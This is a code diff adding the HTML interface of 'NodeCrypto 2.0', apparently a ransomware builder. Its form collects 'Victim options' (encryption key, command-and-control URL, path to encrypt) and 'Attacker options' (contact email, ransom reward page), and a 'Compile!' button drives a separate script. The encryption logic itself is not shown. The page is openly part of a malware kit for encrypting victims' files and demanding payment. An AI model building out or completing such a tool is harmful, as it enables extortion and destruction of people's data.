@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP --> 
+    <title>NodeCrypto 2.0</title>
+        <script src="js/jquery-3.4.1.min.js"></script>
+        <link rel="stylesheet" href="css/uikit.min.css" />
+        <script src="js/uikit.min.js"></script>
+        <script src="js/uikit-icons.min.js"></script>
+  </head>
+  <body>
+<div class="uk-container"><br />
+    <h1><img src="css/logo-nodecrypto.png" height="100" width="100"> NodeCrypto!</h1>
+ 
+         
+
+ <div class="uk-child-width-expand@s " uk-grid>
+<div>
+<legend class="uk-legend">Victim options</legend>
+    <fieldset class="uk-fieldset">
+        <div class="uk-margin">        
+			<label class="uk-form-label">Secret Key</label>
+            <input class="uk-input" type="text" placeholder="PrivateKey" name="PrivateKey" id="PrivateKey">
+        </div>
+        <div class="uk-margin">
+			<label class="uk-form-label">Url of Command and Control</label>
+            <input class="uk-input" type="text" placeholder="http://localhost/?page=insert" name="serverCC" id="serverCC">
+        </div>
+        <div class="uk-margin">
+			<label class="uk-form-label">Path to encrypt</label>
+            <input class="uk-input" type="text" placeholder="/home/user/Desktop/" name="infectPath" id="infectPath">
+        </div>
+   		<button id="runCompile" class="uk-button uk-button-secondary">Compile!</button>
+
+    </fieldset>
+ </div>
+ <div><legend class="uk-legend">Attacker options</legend>
+    <fieldset class="uk-fieldset">
+        <div class="uk-margin">        
+			<label class="uk-form-label">Contact mail</label>
+            <input class="uk-input" type="text" placeholder="yourmail@protonmail.com" name="contactMail" id="contactMail">
+        </div>
+        <div class="uk-margin">
+			<label class="uk-form-label">Open Reward</label>
+            <select class="uk-select" name="openReward" id="openReward">
+                <option value="true">True</option>
+                <option value="false">False</option>
+            </select>
+        </div>
+        <div class="uk-margin">
+			<label class="uk-form-label">Url (or local file) of reward</label>
+            <input class="uk-input" type="text" placeholder="http://localhost/reward.html" name="rewardUrl" id="rewardUrl">
+        </div> 
+ 
+ 
+
+    </fieldset>
+ </div>
+    <script src="./renderer.js"></script>
+</div>
+  </body>
+</html>
